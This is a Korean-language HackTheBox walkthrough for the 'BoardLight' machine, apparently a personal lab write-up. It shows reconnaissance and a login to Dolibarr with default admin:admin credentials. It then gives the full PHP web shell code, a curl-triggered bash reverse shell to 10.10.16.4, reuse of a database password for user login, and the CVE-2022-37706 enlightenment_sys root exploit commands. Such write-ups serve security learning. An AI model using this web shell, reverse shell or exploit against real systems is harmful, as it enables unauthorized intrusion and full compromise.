# BoardLight - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA boardlight 10.10.11.11
```
<img width="1107" height="416" alt="image" src="https://github.com/user-attachments/assets/c934c156-9d77-4afa-907f-6f46327d5f12" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.11

curl -IL http://10.10.11.11
```
<img width="1107" height="246" alt="image" src="https://github.com/user-attachments/assets/df0f857e-92ba-4aaa-b24b-4120f9712448" />

<br>
<br>

- `/etc/hosts`에 `board.htb` 추가.
<img width="1107" height="63" alt="image" src="https://github.com/user-attachments/assets/4b40b98f-6e58-4635-a00b-1acb585e526a" />

### VHOST
- `crm.board.htb`발견.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb -H 'Host:FUZZ.board.htb' -fs 15949 -mc all
```
<img width="1107" height="588" alt="image" src="https://github.com/user-attachments/assets/6e5b42f4-81e5-4135-961e-ddf9328d1cf5" />

<br>
<br>

- `/etc/hosts`에 등록.
<img width="1107" height="65" alt="image" src="https://github.com/user-attachments/assets/9339fdec-0501-46df-ba6f-d51f57560f4f" />

### WEB SHELL
- `Dolibarr 17.0.0`
<img width="913" height="500" alt="image" src="https://github.com/user-attachments/assets/548416f4-6a31-4d29-a6fa-2b1d3dffe0be" />

<br>
<br>

- `admin:admin`으로 로그인.
<img width="913" height="500" alt="image" src="https://github.com/user-attachments/assets/716cbf35-6e33-4385-b455-af24391b7d9e" />

<br>
<br>

- `Websites > Add website`
<img width="1100" height="331" alt="image" src="https://github.com/user-attachments/assets/9d9bc447-0139-432e-93d5-7d1243277eb7" />

<br>
<br>

- `webshell`코드를 내용에 입력하여 저장.
- 한번에 안될때가 있어서 2~3번 정도 `Edit page/container properties`를 눌러서 수정하여 저장.
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```
<img width="1098" height="500" alt="image" src="https://github.com/user-attachments/assets/f6039a69-b8ee-46ef-9918-b866020376b9" />

<br>
<br>

- 오른쪽 끝의 망원경 모양을 클릭하여 확인.
<img width="1100" height="310" alt="image" src="https://github.com/user-attachments/assets/6c0c81bd-de78-4391-8232-44a8e0144c0b" />

<br>
<br>

- 명령어 실행.
<img width="1100" height="50" alt="image" src="https://github.com/user-attachments/assets/9e422aa6-fd99-404e-bef4-007310a37d0b" />

<br>
<br>

- 리버스 셸 코드 실행.
```bash
curl 'http://crm.board.htb/public/website/index.php?website=test&pageref=test&nocache=1766546339&cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1107" height="64" alt="image" src="https://github.com/user-attachments/assets/51932467-7671-49a8-a2cc-9e5c3a90e893" />

<br>
<br>

- 셸 획득.
<img width="1104" height="227" alt="image" src="https://github.com/user-attachments/assets/9031b220-1244-4dc3-9a65-239c65b69fc7" />

## Privesc
- `/var/www/html/crm.board.htb/htdocs/conf`폴더의 `conf.php`에서 `mysql`계정 정보를 획득.
<img width="1104" height="220" alt="image" src="https://github.com/user-attachments/assets/c592261e-ef59-441a-b067-4a0d1b63f47e" />

<br>
<br>

- `mysql`로 접속하여 DB를 확인하였으나 특별한 내용은 확인하지 못함.
```bash
mysql -hlocalhost -udolibarrowner -p'serverfun2$2023!!'
```

<br>

- `/etc/passwd`에서 `larissa`유저 발견.
```bash
cat /etc/passwd | grep sh
```
<img width="1104" height="59" alt="image" src="https://github.com/user-attachments/assets/325b7e31-d9dd-4ec8-b36a-65c7a3b998af" />

<br>
<br>

- `larissa:serverfun2$2023!!` 로그인.
```bash
su - larissa
```
<img width="1104" height="83" alt="image" src="https://github.com/user-attachments/assets/11e5a6a9-9c58-4f5b-b536-4de38945fc5e" />

<br>
<br>

- `enlightenment_sys`에 SUID가 설정되어있는 것을 확인.
```bash
find / -perm -4000 2>/dev/null
```
<img width="1104" height="157" alt="image" src="https://github.com/user-attachments/assets/8073fd97-24f8-487d-bcab-920801aefb5d" />

<br>
<br>

- `enlightenment` 버전 확인.
```bash
enlightenment -version
```
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/32867790-24a5-4ad7-a468-35f706458ed6" />

### CVE-2022-37706
<img width="1100" height="426" alt="image" src="https://github.com/user-attachments/assets/3ff8bdbf-0031-4bf7-b849-0575697aeaf2" />

<br>
<br>

- https://github.com/d3ndr1t30x/CVE-2022-37706/blob/main/exploit.sh
- 스크립트를 참조하여 `root` 획득.
```bash
mkdir -p /tmp/net

mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit

chmod +x /tmp/exploit

/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```
<img width="1107" height="173" alt="image" src="https://github.com/user-attachments/assets/914c3008-aec6-47f6-abf4-01a55dc6a289" />

## FLAG
- `/home/larissa/user.txt`
<img width="1107" height="442" alt="image" src="https://github.com/user-attachments/assets/6e581d74-2150-46ee-974c-689a8a6bdea9" />

<br>
<br>

- `/root/root.txt`
<img width="1107" height="309" alt="image" src="https://github.com/user-attachments/assets/83d4d566-6be7-447d-a713-74a38f7eba2b" />



















